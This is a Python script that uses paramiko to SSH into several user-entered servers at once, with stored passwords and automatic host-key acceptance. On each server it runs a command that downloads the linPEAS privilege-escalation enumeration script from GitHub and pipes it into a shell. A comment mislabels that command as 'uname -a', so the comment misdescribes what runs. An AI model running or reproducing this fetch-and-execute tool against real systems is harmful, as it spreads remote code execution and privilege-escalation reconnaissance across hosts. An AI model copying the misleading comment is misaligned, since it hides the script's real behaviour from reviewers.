import paramiko
import threading

def ssh_connect(hostname, port, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_client.connect(hostname, port=port, username=username, password=password)
        print(f"Connected to {hostname}")
        
        # Execute the 'uname -a' command
        stdin, stdout, stderr = ssh_client.exec_command("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")
        
        # Read and print the command output
        output = stdout.read().decode()
        print(f"Output from {hostname}:\n{output}")
        
        # Remember to close the connection when done
        ssh_client.close()
    except Exception as e:
        print(f"Failed to connect to {hostname}: {str(e)}")
        # Handle exceptions or log errors here

# Get user input
servers = []
num_servers = int(input("Enter the number of servers: "))

for i in range(num_servers):
    hostname = input(f"Enter the hostname for server {i + 1}: ")
    port = 22  # You can modify this to take port input if needed
    username = input(f"Enter the username for server {i + 1}: ")
    password = input(f"Enter the password for server {i + 1}: ")

    server_info = {"hostname": hostname, "port": port, "username": username, "password": password}
    servers.append(server_info)

threads = []

for server in servers:
    thread = threading.Thread(target=ssh_connect, args=(server["hostname"], server["port"], server["username"], server["password"]))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()
